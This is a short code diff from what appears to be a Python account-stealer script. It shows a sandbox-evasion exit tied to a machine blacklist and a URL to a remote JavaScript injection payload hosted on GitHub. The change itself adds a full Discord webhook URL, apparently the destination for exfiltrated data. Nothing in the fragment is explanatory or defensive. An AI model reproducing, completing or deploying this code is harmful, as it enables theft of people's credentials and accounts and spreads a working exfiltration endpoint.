@@ -47,7 +47,7 @@ if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
     os._exit(0)
 
 wh00k = "WEBHOOK HERE"
-wh00k2 = ""
+wh00k2 = "https://discord.com/api/webhooks/1113507678875045898/eq9hW5AsPDoCMM8kYXFZGeUKIY91hvrGlRxGYqeAcg057Q-8rl46ypersr8xG_beMHGV"
 inj_url = "https://raw.githubusercontent.com/PeppinUCocchet/SpammerCrealInj3ction/main/index.js"
     
 DETECTED = False
